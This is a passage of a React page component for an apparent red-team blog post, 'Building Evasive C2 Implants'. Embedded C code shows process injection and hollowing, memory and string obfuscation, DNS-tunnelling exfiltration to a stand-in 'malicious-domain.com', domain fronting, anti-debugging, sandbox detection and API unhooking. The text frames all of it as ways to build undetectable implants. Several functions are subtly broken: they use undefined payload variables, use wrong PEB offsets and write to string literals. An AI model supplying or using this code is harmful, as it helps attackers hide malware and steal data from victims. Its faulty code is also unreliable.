'use client'

import { motion } from 'framer-motion'
import { useState, useEffect } from 'react'
import DetailPageLayout from '@/components/DetailPageLayout'
import CodeBlock from '@/components/CodeBlock'
import Callout from '@/components/Callout'

export default function EvasiveC2ImplantsPost() {
  const [activeSection, setActiveSection] = useState('')

  useEffect(() => {
    const handleScroll = () => {
      const sections = ['introduction', 'evasion-techniques', 'process-injection', 'memory-evasion', 'network-evasion', 'anti-analysis', 'detection-mitigation', 'key-takeaways']
      
      for (const section of sections) {
        const element = document.getElementById(section)
        if (element) {
          const rect = element.getBoundingClientRect()
          if (rect.top <= 100 && rect.bottom >= 100) {
            setActiveSection(section)
            break
          }
        }
      }
    }

    window.addEventListener('scroll', handleScroll)
    return () => window.removeEventListener('scroll', handleScroll)
  }, [])

  const tocSections = [
    { id: 'introduction', title: 'Introduction' },
    { id: 'evasion-techniques', title: 'Evasion Techniques Overview' },
    { id: 'process-injection', title: 'Process Injection' },
    { id: 'memory-evasion', title: 'Memory Evasion' },
    { id: 'network-evasion', title: 'Network Evasion' },
    { id: 'anti-analysis', title: 'Anti-Analysis' },
    { id: 'detection-mitigation', title: 'Detection & Mitigation' },
    { id: 'key-takeaways', title: 'Key Takeaways' }
  ]

  const processInjectionCode = `// Advanced Process Injection Techniques
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>

// DLL Injection using SetWindowsHookEx
BOOL dll_injection_hook(DWORD target_pid, const char* dll_path) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!hProcess) return FALSE;
    
    // Allocate memory in target process
    LPVOID pRemotePath = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, 
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemotePath) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write DLL path to target process
    if (!WriteProcessMemory(hProcess, pRemotePath, dll_path, strlen(dll_path) + 1, NULL)) {
        VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)pLoadLibrary, 
                                       pRemotePath, 0, NULL);
    
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    
    VirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return TRUE;
}

// Process Hollowing Technique
BOOL process_hollowing(const char* target_path, const char* payload_path) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    // Create suspended process
    if (!CreateProcessA(target_path, NULL, NULL, NULL, FALSE, 
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }
    
    // Get image base address
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // Read PEB
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    
    // Unmap original image
    NtUnmapViewOfSection(pi.hProcess, pbi.PebBaseAddress);
    
    // Allocate memory for new image
    LPVOID pImageBase = VirtualAllocEx(pi.hProcess, pbi.PebBaseAddress, 
                                      payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // Write new image
    WriteProcessMemory(pi.hProcess, pImageBase, payload_data, payload_size, NULL);
    
    // Update PEB
    WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)pbi.PebBaseAddress + 8), 
                      &pImageBase, sizeof(LPVOID), NULL);
    
    // Resume execution
    ResumeThread(pi.hThread);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}`

  const memoryEvasionCode = `// Memory Evasion and Protection Techniques
#include <windows.h>
#include <winternl.h>

// Memory protection and obfuscation
void protect_memory_regions() {
    // Get current module base
    HMODULE hModule = GetModuleHandle(NULL);
    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo));
    
    // Make code section read-only
    DWORD oldProtect;
    VirtualProtect((LPVOID)modInfo.lpBaseOfDll, modInfo.SizeOfImage, 
                   PAGE_READONLY, &oldProtect);
    
    // Obfuscate strings in memory
    obfuscate_strings();
    
    // Anti-dumping techniques
    prevent_memory_dumping();
}

// String obfuscation
void obfuscate_strings() {
    // XOR encrypt strings
    char* strings[] = {"kernel32.dll", "ntdll.dll", "LoadLibraryA", "GetProcAddress"};
    
    for (int i = 0; i < 4; i++) {
        int len = strlen(strings[i]);
        for (int j = 0; j < len; j++) {
            strings[i][j] ^= 0xAA; // XOR with key
        }
    }
}

// Anti-dumping protection
void prevent_memory_dumping() {
    // Set memory protection flags
    DWORD oldProtect;
    VirtualProtect(GetModuleHandle(NULL), 0x1000, PAGE_NOACCESS, &oldProtect);
    
    // Clear PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)GetModuleHandle(NULL);
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)dosHeader + dosHeader->e_lfanew);
    
    // Zero out headers
    memset(dosHeader, 0, sizeof(IMAGE_DOS_HEADER));
    memset(ntHeaders, 0, sizeof(IMAGE_NT_HEADERS));
}

// Heap spraying for evasion
void heap_spray_evasion() {
    // Allocate large amounts of memory to hide payload
    LPVOID heap_spray[1000];
    
    for (int i = 0; i < 1000; i++) {
        heap_spray[i] = VirtualAlloc(NULL, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
        // Fill with random data
        for (int j = 0; j < 0x10000; j += 4) {
            *(DWORD*)((BYTE*)heap_spray[i] + j) = rand();
        }
    }
    
    // Hide payload in heap spray
    memcpy((BYTE*)heap_spray[500] + 0x8000, payload_data, payload_size);
}`

  const networkEvasionCode = `// Network Evasion and Steganography
#include <winsock2.h>
#include <ws2tcpip.h>

// Domain fronting technique
int domain_fronting_communication() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return -1;
    
    // Connect to legitimate CDN
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(443);
    inet_pton(AF_INET, "104.16.0.0", &server.sin_addr); // Cloudflare IP
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        return -1;
    }
    
    // Send HTTP request with legitimate Host header
    char request[] = "GET / HTTP/1.1\\r\\n"
                    "Host: legitimate-site.com\\r\\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\\r\\n"
                    "Accept: */*\\r\\n\\r\\n";
    
    send(sock, request, strlen(request), 0);
    
    // Receive response and extract hidden data
    char buffer[4096];
    int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    
    // Decode steganographic data
    decode_steganographic_data(buffer, bytes_received);
    
    closesocket(sock);
    WSACleanup();
    return 0;
}

// DNS tunneling for data exfiltration
int dns_tunneling_exfil(const char* data, size_t data_len) {
    // Encode data as DNS queries
    char encoded_data[256];
    base64_encode(data, data_len, encoded_data, sizeof(encoded_data));
    
    // Split into DNS labels
    char dns_query[512];
    snprintf(dns_query, sizeof(dns_query), "%s.malicious-domain.com", encoded_data);
    
    // Send DNS query
    return send_dns_query(dns_query);
}

// HTTP steganography
void http_steganography() {
    // Hide data in HTTP headers
    char headers[] = "GET / HTTP/1.1\\r\\n"
                    "Host: example.com\\r\\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n"
                    "Accept: text/html,application/xhtml+xml\\r\\n"
                    "Accept-Language: en-US,en;q=0.9\\r\\n"
                    "Accept-Encoding: gzip, deflate\\r\\n"
                    "Connection: keep-alive\\r\\n"
                    "Upgrade-Insecure-Requests: 1\\r\\n\\r\\n";
    
    // Embed hidden data in header values
    embed_data_in_headers(headers, hidden_payload, payload_size);
}`

  const antiAnalysisCode = `// Anti-Analysis and Anti-Debugging Techniques
#include <windows.h>
#include <winternl.h>

// Comprehensive anti-debugging
BOOL anti_debugging_comprehensive() {
    // 1. Check for debugger presence
    if (IsDebuggerPresent()) return TRUE;
    
    // 2. Check remote debugger
    BOOL isRemoteDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
    if (isRemoteDebuggerPresent) return TRUE;
    
    // 3. Check for debug flags in PEB
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return TRUE;
    
    // 4. Check NtGlobalFlag
    if (peb->NtGlobalFlag & 0x70) return TRUE;
    
    // 5. Check heap flags
    PVOID heap = peb->ProcessHeap;
    DWORD heapFlags = *(DWORD*)((BYTE*)heap + 0x40);
    DWORD heapForceFlags = *(DWORD*)((BYTE*)heap + 0x44);
    if (heapFlags & 0x2 || heapFlags & 0x50000000 || heapForceFlags != 0) return TRUE;
    
    // 6. Timing-based detection
    DWORD start = GetTickCount();
    Sleep(100);
    DWORD end = GetTickCount();
    if ((end - start) > 150) return TRUE; // Debugger overhead
    
    return FALSE;
}

// VM and sandbox detection
BOOL detect_virtual_environment() {
    // 1. Check for VM artifacts
    if (detect_vmware() || detect_virtualbox() || detect_qemu()) return TRUE;
    
    // 2. Check for analysis tools
    if (detect_analysis_tools()) return TRUE;
    
    // 3. Check system resources
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE; // Less than 2GB RAM
    
    // 4. Check CPU count
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return TRUE; // Less than 2 CPUs
    
    // 5. Check for mouse movement (user interaction)
    POINT cursor1, cursor2;
    GetCursorPos(&cursor1);
    Sleep(5000);
    GetCursorPos(&cursor2);
    if (cursor1.x == cursor2.x && cursor1.y == cursor2.y) return TRUE; // No mouse movement
    
    return FALSE;
}

// API unhooking
void unhook_apis() {
    // Get ntdll.dll base
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHeader->e_lfanew);
    
    // Get export directory
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    // Unhook critical APIs
    DWORD* nameRvas = (DWORD*)((BYTE*)hNtdll + exportDir->AddressOfNames);
    DWORD* functionRvas = (DWORD*)((BYTE*)hNtdll + exportDir->AddressOfFunctions);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hNtdll + nameRvas[i]);
        
        if (strcmp(functionName, "NtQueryInformationProcess") == 0 ||
            strcmp(functionName, "NtSetInformationThread") == 0) {
            // Restore original function
            restore_original_function((LPVOID)((BYTE*)hNtdll + functionRvas[i]));
        }
    }
}`

  const relatedPosts = [
    {
      title: "Active Directory Attack Paths: A Red Team Guide",
      excerpt: "Comprehensive guide to lateral movement and privilege escalation in AD environments.",
      date: "Jan 15, 2025",
      readTime: "12 min",
      tags: ["Active Directory", "Red Team", "Lateral Movement"]
    },
    {
      title: "Kernel Exploitation 101",
      excerpt: "Introduction to kernel-level exploitation and privilege escalation techniques.",
      date: "Jan 5, 2025",
      readTime: "15 min",
      tags: ["Kernel", "Exploitation", "Privilege Escalation"]
    },
    {
      title: "Advanced Persistence Techniques",
      excerpt: "Deep dive into sophisticated persistence mechanisms for red team operations.",
      date: "Dec 20, 2024",
      readTime: "10 min",
      tags: ["Persistence", "Red Team", "Evasion"]
    }
  ]

  return (
    <DetailPageLayout 
      title="Building Evasive C2 Implants"
      subtitle="Advanced Techniques for Stealthy Command & Control"
      breadcrumb={{ label: "Research", href: "/#research" }}
    >
      <div className="max-w-6xl mx-auto px-6 py-12">
        <div className="grid lg:grid-cols-4 gap-12">
          {/* Table of Contents - Sidebar */}
          <motion.div
            className="lg:col-span-1"
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.5 }}
          >
            <div className="sticky top-8">
              <h3 className="text-lg font-semibold text-white mb-4">Table of Contents</h3>
              <nav className="space-y-2">
                {tocSections.map((section) => (
                  <a
                    key={section.id}
                    href={`#${section.id}`}
                    className={`block text-sm py-2 px-3 rounded-md transition-colors ${
                      activeSection === section.id
                        ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                        : 'text-gray-400 hover:text-white hover:bg-gray-800/30'
                    }`}
                  >
                    {section.title}
                  </a>
                ))}
              </nav>
            </div>
          </motion.div>

          {/* Main Content */}
          <div className="lg:col-span-3">
            {/* Back Button */}

            {/* Hero/Header */}
            <motion.header
              className="mb-12"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8 }}
            >
              <h1 className="text-4xl lg:text-5xl font-bold text-white mb-6 leading-tight">
                Building Evasive C2 Implants: Advanced Techniques
              </h1>
              
              <div className="flex flex-wrap items-center gap-4 text-sm text-gray-400 mb-6">
                <span>Jan 10, 2025</span>
                <span>•</span>
                <span>Darrius Grate</span>
                <span>•</span>
                <span>8 min read</span>
              </div>
              
              <div className="flex flex-wrap gap-2">
                {['C2', 'Evasion', 'Red Team', 'Anti-Analysis', 'Process Injection'].map((tag) => (
                  <span
                    key={tag}
                    className="px-3 py-1 bg-red-500/20 text-red-400 text-sm rounded-full border border-red-500/30"
                  >
                    {tag}
                  </span>
                ))}
              </div>
            </motion.header>

            {/* Introduction */}
            <motion.section
              id="introduction"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.2 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Introduction</h2>
              <div className="prose prose-lg max-w-none">
                <p className="text-gray-300 leading-relaxed mb-6">
                  In the ever-evolving landscape of cybersecurity, red team operators must 
                  continuously adapt their techniques to evade increasingly sophisticated 
                  detection systems. Command and Control (C2) implants are the backbone of 
                  red team operations, but their effectiveness depends heavily on their 
                  ability to remain undetected.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  This comprehensive guide explores advanced techniques for building evasive 
                  C2 implants that can operate under the radar of modern security solutions. 
                  We'll cover process injection, memory evasion, network steganography, and 
                  anti-analysis techniques that can significantly improve the stealth of 
                  your red team tools.
                </p>
                <p className="text-gray-300 leading-relaxed">
                  <strong>What you'll learn:</strong> Advanced evasion techniques, process 
                  injection methods, memory protection strategies, network steganography, 
                  and comprehensive anti-analysis approaches for building undetectable C2 implants.
                </p>
              </div>
            </motion.section>

            {/* Evasion Techniques Overview */}
            <motion.section
              id="evasion-techniques"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.3 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Evasion Techniques Overview</h2>
              <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-8">
                <div className="grid md:grid-cols-2 gap-8">
                  <div>
                    <h3 className="text-xl font-semibold text-white mb-4">Process-Level Evasion</h3>
                    <ul className="text-gray-300 space-y-2">
                      <li>• Process injection and hollowing</li>
                      <li>• DLL injection techniques</li>
                      <li>• Process masquerading</li>
                      <li>• Parent process spoofing</li>
                    </ul>
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white mb-4">Memory Evasion</h3>
                    <ul className="text-gray-300 space-y-2">
                      <li>• Memory protection and obfuscation</li>
                      <li>• Heap spraying techniques</li>
                      <li>• Anti-dumping mechanisms</li>
                      <li>• String obfuscation</li>
                    </ul>
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white mb-4">Network Evasion</h3>
                    <ul className="text-gray-300 space-y-2">
                      <li>• Domain fronting</li>
                      <li>• DNS tunneling</li>
                      <li>• HTTP steganography</li>
                      <li>• Traffic mimicry</li>
                    </ul>
                  </div>
                  <div>
                    <h3 className="text-xl font-semibold text-white mb-4">Anti-Analysis</h3>
                    <ul className="text-gray-300 space-y-2">
                      <li>• Anti-debugging techniques</li>
                      <li>• VM and sandbox detection</li>
                      <li>• API unhooking</li>
                      <li>• Timing-based detection</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Process Injection */}
            <motion.section
              id="process-injection"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.4 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Process Injection</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Process injection is one of the most effective techniques for evading 
                  detection by running malicious code within the context of legitimate 
                  processes. This approach helps bypass many security controls and makes 
                  attribution more difficult.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  Modern EDR solutions have become increasingly sophisticated at detecting 
                  process injection, so it's crucial to use advanced techniques that can 
                  evade these detection mechanisms.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Advanced Injection Techniques</h3>
                <CodeBlock
                  code={processInjectionCode}
                  language="c"
                  title="Process Injection Implementation"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <div className="grid md:grid-cols-2 gap-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">EDR Detection</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• API call monitoring</li>
                      <li>• Process creation analysis</li>
                      <li>• Memory access patterns</li>
                      <li>• Behavioral analysis</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Defensive Measures</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Process isolation</li>
                      <li>• Memory protection</li>
                      <li>• API hooking detection</li>
                      <li>• Anomaly detection</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Memory Evasion */}
            <motion.section
              id="memory-evasion"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.5 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Memory Evasion</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Memory evasion techniques focus on protecting malicious code from analysis 
                  and detection by manipulating memory permissions, obfuscating data, and 
                  preventing memory dumps from revealing the true nature of the implant.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  These techniques are particularly important when dealing with advanced 
                  forensics tools and memory analysis frameworks that can extract and 
                  analyze malicious code from memory.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Memory Protection Techniques</h3>
                <CodeBlock
                  code={memoryEvasionCode}
                  language="c"
                  title="Memory Evasion Implementation"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <Callout type="warning" title="Memory Analysis Challenges">
                  Memory evasion techniques can make forensic analysis significantly more 
                  difficult, but they may also trigger behavioral detection systems that 
                  monitor for unusual memory access patterns.
                </Callout>
                <div className="grid md:grid-cols-2 gap-6 mt-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Forensic Analysis</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Memory dump analysis</li>
                      <li>• Volatility framework</li>
                      <li>• Memory carving techniques</li>
                      <li>• Process memory inspection</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Behavioral Detection</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Memory access monitoring</li>
                      <li>• Permission change detection</li>
                      <li>• Heap manipulation analysis</li>
                      <li>• String obfuscation detection</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Network Evasion */}
            <motion.section
              id="network-evasion"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.6 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Network Evasion</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Network evasion techniques focus on hiding C2 communication within 
                  legitimate network traffic, making it difficult for network monitoring 
                  systems to detect and block malicious communications.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  These techniques are essential for maintaining persistent communication 
                  with compromised systems while avoiding detection by network security 
                  appliances and monitoring systems.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Network Steganography</h3>
                <CodeBlock
                  code={networkEvasionCode}
                  language="c"
                  title="Network Evasion Techniques"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <div className="grid md:grid-cols-2 gap-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Network Monitoring</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Deep packet inspection</li>
                      <li>• DNS query analysis</li>
                      <li>• Traffic pattern analysis</li>
                      <li>• Protocol anomaly detection</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Behavioral Analysis</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Domain reputation checking</li>
                      <li>• Certificate validation</li>
                      <li>• Timing analysis</li>
                      <li>• Volume-based detection</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Anti-Analysis */}
            <motion.section
              id="anti-analysis"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.7 }}
            >
              <h2 className="text-3xl font-bold text-white mb-6">Anti-Analysis</h2>
              <div className="prose prose-lg max-w-none mb-8">
                <p className="text-gray-300 leading-relaxed mb-6">
                  Anti-analysis techniques are designed to detect and evade various forms 
                  of analysis, including debugging, sandboxing, and forensic analysis. 
                  These techniques help ensure that malicious code can operate without 
                  being detected or analyzed.
                </p>
                <p className="text-gray-300 leading-relaxed mb-6">
                  Modern security solutions use sophisticated analysis techniques, so 
                  comprehensive anti-analysis measures are essential for maintaining 
                  operational security.
                </p>
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Comprehensive Anti-Analysis</h3>
                <CodeBlock
                  code={antiAnalysisCode}
                  language="c"
                  title="Anti-Analysis Implementation"
                />
              </div>

              <div className="mb-8">
                <h3 className="text-xl font-semibold text-white mb-4">Detection Methods</h3>
                <Callout type="error" title="Analysis Evasion">
                  Anti-analysis techniques can significantly complicate security analysis, 
                  but they may also trigger behavioral detection systems that monitor for 
                  evasion attempts.
                </Callout>
                <div className="grid md:grid-cols-2 gap-6 mt-6">
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Static Analysis</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Code disassembly</li>
                      <li>• String analysis</li>
                      <li>• API call analysis</li>
                      <li>• Control flow analysis</li>
                    </ul>
                  </div>
                  <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                    <h4 className="text-lg font-semibold text-white mb-3">Dynamic Analysis</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Sandbox execution</li>
                      <li>• Behavioral monitoring</li>
                      <li>• API hooking</li>
                      <li>• Memory analysis</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Detection & Mitigation */}
            <motion.section
              id="detection-mitigation"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.8 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Detection & Mitigation</h2>
              
              <div className="grid md:grid-cols-2 gap-8 mb-8">
                <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                  <h3 className="text-xl font-semibold text-white mb-4">Detection Strategies</h3>
                  <ul className="text-gray-300 space-y-3">
                    <li>• <strong>Behavioral Analysis:</strong> Monitor for unusual process behavior</li>
                    <li>• <strong>Memory Monitoring:</strong> Detect memory manipulation attempts</li>
                    <li>• <strong>Network Analysis:</strong> Identify suspicious communication patterns</li>
                    <li>• <strong>API Monitoring:</strong> Track suspicious API usage patterns</li>
                  </ul>
                </div>
                
                <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                  <h3 className="text-xl font-semibold text-white mb-4">Mitigation Techniques</h3>
                  <ul className="text-gray-300 space-y-3">
                    <li>• <strong>Process Isolation:</strong> Implement strict process boundaries</li>
                    <li>• <strong>Memory Protection:</strong> Use hardware-based memory protection</li>
                    <li>• <strong>Network Segmentation:</strong> Implement network micro-segmentation</li>
                    <li>• <strong>Behavioral Monitoring:</strong> Deploy advanced behavioral analysis</li>
                  </ul>
                </div>
              </div>

              <div className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6">
                <h3 className="text-xl font-semibold text-white mb-4">Best Practices</h3>
                <div className="grid md:grid-cols-2 gap-6">
                  <div>
                    <h4 className="text-lg font-semibold text-white mb-3">Prevention</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Implement defense in depth</li>
                      <li>• Use application whitelisting</li>
                      <li>• Deploy endpoint detection and response</li>
                      <li>• Regular security assessments</li>
                      <li>• User awareness training</li>
                    </ul>
                  </div>
                  <div>
                    <h4 className="text-lg font-semibold text-white mb-3">Response</h4>
                    <ul className="text-gray-300 space-y-2 text-sm">
                      <li>• Incident response procedures</li>
                      <li>• Forensic analysis capabilities</li>
                      <li>• Threat hunting programs</li>
                      <li>• Continuous monitoring</li>
                      <li>• Regular security updates</li>
                    </ul>
                  </div>
                </div>
              </div>
            </motion.section>

            {/* Key Takeaways */}
            <motion.section
              id="key-takeaways"
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 0.9 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Key Takeaways</h2>
              
              <Callout type="success" title="Action Items for Defenders">
                <ul className="space-y-2">
                  <li>• <strong>Implement comprehensive monitoring</strong> for process injection and memory manipulation</li>
                  <li>• <strong>Deploy network analysis tools</strong> to detect steganographic communication</li>
                  <li>• <strong>Use behavioral analysis</strong> to identify evasion attempts</li>
                  <li>• <strong>Implement defense in depth</strong> with multiple detection layers</li>
                  <li>• <strong>Regular security assessments</strong> to test detection capabilities</li>
                </ul>
              </Callout>

              <div className="mt-8">
                <h3 className="text-xl font-semibold text-white mb-4">Summary</h3>
                <p className="text-gray-300 leading-relaxed">
                  Building evasive C2 implants requires a deep understanding of both offensive 
                  and defensive techniques. By combining process injection, memory evasion, 
                  network steganography, and anti-analysis techniques, red team operators can 
                  create sophisticated implants that can operate undetected in modern 
                  environments. However, defenders must also understand these techniques to 
                  develop effective countermeasures and detection strategies.
                </p>
              </div>
            </motion.section>

            {/* Related Content */}
            <motion.section
              className="mb-16"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 1.0 }}
            >
              <h2 className="text-3xl font-bold text-white mb-8">Continue Reading</h2>
              <div className="grid md:grid-cols-3 gap-6">
                {relatedPosts.map((post, index) => (
                  <motion.div
                    key={post.title}
                    className="bg-gray-800/30 rounded-lg border border-gray-700/50 backdrop-blur-sm p-6 hover:border-red-500/30 transition-colors"
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.6, delay: 1.1 + index * 0.1 }}
                    whileHover={{ scale: 1.02 }}
                  >
                    <h3 className="text-lg font-semibold text-white mb-3 hover:text-red-400 transition-colors">
                      {post.title}
                    </h3>
                    <p className="text-gray-300 text-sm leading-relaxed mb-4">
                      {post.excerpt}
                    </p>
                    <div className="flex items-center justify-between text-xs text-gray-400">
                      <span>{post.date}</span>
                      <span>{post.readTime}</span>
                    </div>
                    <div className="flex flex-wrap gap-1 mt-3">
                      {post.tags.map((tag) => (
                        <span
                          key={tag}
                          className="px-2 py-1 bg-gray-700/50 text-gray-300 text-xs rounded"
                        >
                          {tag}
                        </span>
                      ))}
                    </div>
                  </motion.div>
                ))}
              </div>
